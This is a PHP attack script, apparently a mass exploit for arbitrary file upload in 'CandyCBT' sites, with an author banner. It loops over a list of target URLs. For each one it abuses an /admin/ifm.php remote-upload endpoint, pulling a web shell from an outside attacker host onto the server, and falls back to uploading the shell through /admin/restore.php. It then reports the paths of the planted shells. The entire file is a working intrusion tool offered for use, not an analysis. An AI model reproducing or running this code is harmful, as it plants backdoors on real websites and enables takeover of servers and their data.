<?php

function req($url, $post = null) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  if ($post) {
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  }
  curl_setopt($ch, CURLOPT_TIMEOUT, 5);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $xx = curl_exec($ch);
  curl_close($ch);
  return $xx;
}

$green = "\033[0;32m";
$red = "\033[0;31m";
$blue = "\033[0;34m";
$white = "\033[1;37m";

system("clear");

echo $blue."
 _______                 _       _______ ______ _______
(_______)               | |     (_______|____  (_______)
 _       _____ ____   __| |_   _ _       ____)  )  _     Arbitrary
| |     (____ |  _ \ / _  | | | | |     |  __  (  | |    File
| |_____/ ___ | | | ( (_| | |_| | |_____| |__)  ) | |    Upload
 \______)_____|_| |_|\____|\__  |\______)______/  |_|
                          (____/                        v.2^
       {$white}Author: N4ST4R_ID | www.naxtarrr.my.id
 \n";

$web = $argv[1];
if (!$web) exit("{$red}[!] Usage php {$argv[0]} list.txt\n");
if (!file_exists($web)) exit("{$red}[!] File {$argv[1]} not found\n");
$get = file_get_contents($web);
$exp = explode("\n", $get);

if (!file_exists("nax.php")) {
  $open = fopen("nax.php", "w");
  fwrite($open, file_get_contents("https://raw.githubusercontent.com/nastar-id/naxtarrr-shell/main/nax-shell.php"));
  fclose($open);
}
$shell = new CURLFile("nax.php");

foreach ($exp as $explode) {
  $request = req($explode."/admin/ifm.php", "api=remoteUpload&dir=&filename=nax.php&method=curl&url=http://naxtarrr.fortysinc.com/nax.txt");
  if (preg_match("/File successfully uploaded/", $request)) {
    echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/files/nax.php\n\n";
  } else {
    echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n";
    echo "{$blue}[*] Checking restore file\n";
    $upload2 = req($explode."/admin/restore.php", ["datafile" => $shell]);
    if (preg_match("/berhasil/", $upload2)) {
      echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/admin/nax.php\n\n";
    } else {
      echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n\n";
    }
  }
}
?>
